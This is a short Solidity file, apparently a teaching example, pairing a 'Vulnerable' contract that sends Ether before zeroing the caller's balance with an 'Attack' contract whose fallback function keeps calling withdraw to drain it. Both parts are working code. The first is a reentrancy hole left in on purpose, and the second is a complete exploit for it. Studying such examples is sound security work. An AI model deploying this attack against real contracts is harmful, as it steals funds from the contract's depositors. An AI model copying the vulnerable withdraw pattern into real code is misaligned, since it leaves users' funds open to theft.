#The below contract, "Vulnerable", has a reentrancy vulnerability within it. The next contract, "Attack", will successfully exploit this vulnerability within "Vulnerable".

pragma solidity ^0.8.0;

contract Vulnerable{
    mapping(address => uint) public balances;

    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        uint bal = balances[msg.sender];
        require( bal > 0 );
    (bool sent, ) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");

    balances[msg.sender] = 0;
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}


contract Attack{
    Vulnerable public exploit;

    constructor(address _exploitAddress){
exploit = Vulnerable(_exploitAddress);
    }

    fallback() external payable{
        if(address(exploit).balance >=1 ether){
                exploit.withdraw();
        }
    }


    function attack() external payable{
        require(msg.value >=1 ether);
        exploit.deposit{value: 1 ether}();
        exploit.withdraw();
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }

}
